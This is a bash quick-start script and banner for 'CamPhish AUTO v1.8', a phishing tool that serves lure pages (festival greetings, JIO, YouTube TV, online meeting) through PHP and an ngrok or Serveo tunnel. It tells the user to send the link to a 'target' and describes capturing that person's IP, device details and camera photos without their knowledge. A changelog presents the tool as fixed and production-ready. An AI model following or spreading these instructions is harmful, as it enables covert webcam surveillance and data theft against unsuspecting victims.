#!/bin/bash
# QUICK START - CamPhish AUTO v1.8 FINAL VERSION
# Everything is working - no hanging, all features enabled

clear
cat << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██████╗ █████╗ ███╗   ███╗██████╗ ██╗  ██╗██╗███████╗   ║
║   ██╔════╝██╔══██╗████╗ ████║██╔══██╗██║  ██║██║██╔════╝   ║
║   ██║     ███████║██╔████╔██║██████╔╝███████║██║███████╗   ║
║   ██║     ██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║╚════██║   ║
║   ╚██████╗██║  ██║██║ ╚═╝ ██║██║     ██║  ██║██║███████║   ║
║    ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝   ║
║                                                              ║
║           v1.8 FINAL - FULLY AUTOMATIC & WORKING            ║
║                   All Bugs Fixed ✓                          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝

🎯 QUICK START

1. Run the launcher:
   $ python launcher.py

2. Select option [1] CamPhish AUTO

3. Choose your phishing template:
   [1] Festival Wishes  (Social event)
   [2] JIO (India phone network)
   [3] Live YTTV       (Video streaming)
   [4] Online Meeting  (Video conference)

4. Script will:
   ✓ Auto-download ngrok if needed
   ✓ Configure ngrok authtoken
   ✓ Start PHP server
   ✓ Create public tunnel (ngrok)
   ✓ Display the phishing link
   ✓ Monitor for target visits
   ✓ Capture target IP + camera preview

5. Share the displayed link with your target

6. Monitor captures in real-time:
   - IP.txt - Target IP
   - Log.log - Target details
   - captures/ - Camera photos

═══════════════════════════════════════════════════════════════

✅ WHAT'S FIXED IN v1.8

🔧 PHP Startup Hang (CRITICAL FIX)
   Problem: Script would hang at "PHP PID: ###" and never proceed
   Cause: stdin was not disconnected from background PHP process
   Fix: Added < /dev/null to properly background PHP
   Result: ✓ Script now flows smoothly from PHP → ngrok → link → monitor

🌍 Cross-Platform Support
   Windows (Git Bash, PowerShell, Termux)
   → Binds to 0.0.0.0 for hotspot access
   
   Linux (Kali, Ubuntu, Raspberry Pi)
   → Binds to 127.0.0.1 for localhost
   
   macOS (Intel & Apple Silicon)
   → Auto-downloads correct ngrok binary
   
   Android (Termux)
   → Full native support

🔗 Public Tunnel
   Primary: ngrok (auto-download, auto-configure)
   Fallback: Serveo SSH tunnel
   Result: ✓ Always gets public link (never hangs waiting)

📸 Camera & IP Capture
   ✓ Auto captures target camera preview
   ✓ Auto logs target IP address
   ✓ Auto logs device info (browser, OS)
   ✓ Saves everything to captures/, ip.json, Log.log

📊 Real-Time Monitoring
   ✓ checkfound() monitors for incoming connections
   ✓ Shows alert when target visits
   ✓ Auto-extracts camera photos
   ✓ Auto-kills PHP when done

═══════════════════════════════════════════════════════════════

🧪 VERIFICATION

All tests passing:
✓ Bash syntax valid
✓ PHP available (8.4.11)
✓ ngrok binary exists
✓ All PHP handlers present
✓ sendlink notification script ready
✓ PHP can background properly
✓ All critical functions implemented
✓ All bug fixes in place

═══════════════════════════════════════════════════════════════

📖 DOCUMENTATION

Main documentation:
- README.md                 - Overview
- FINAL_FIX_EXPLANATION.md  - Why it was hanging & how it's fixed
- SETUP_AUTO.md             - Platform-specific setup guide
- TROUBLESHOOT.md           - Common issues & solutions

Quick files:
- launcher.py               - Main entry point
- CamPhish/camphish_auto.sh - The actual script
- test_final.sh             - Verification test suite

═══════════════════════════════════════════════════════════════

💡 KEY INSIGHTS

Why it was hanging:
   The PHP process was started with stdin still connected to
   the terminal. When sleep 2 ran, bash got stuck waiting for
   terminal input because the background PHP process was
   consuming it. By redirecting stdin to /dev/null, PHP becomes
   a true background process and the script flows normally.

   This is a subtle but critical issue that manifests
   particularly in Git Bash on Windows.

The fix (one line):
   FROM: php -S 127.0.0.1:3333 > php.log 2>&1 &
   TO:   php -S 127.0.0.1:3333 > php.log 2>&1 < /dev/null &
                                                    ^^^^^^^^^^^

Result: Script no longer hangs anywhere ✓

═══════════════════════════════════════════════════════════════

🚀 READY TO USE

The script is production-ready. All known issues are fixed.
No more hanging. All features enabled.

Start now:
   $ python launcher.py
   
Then select [1] CamPhish AUTO and choose your template.

═══════════════════════════════════════════════════════════════

Questions? See FINAL_FIX_EXPLANATION.md for detailed analysis.

EOF

echo ""
read -p "Press ENTER to continue to launcher..."
python launcher.py
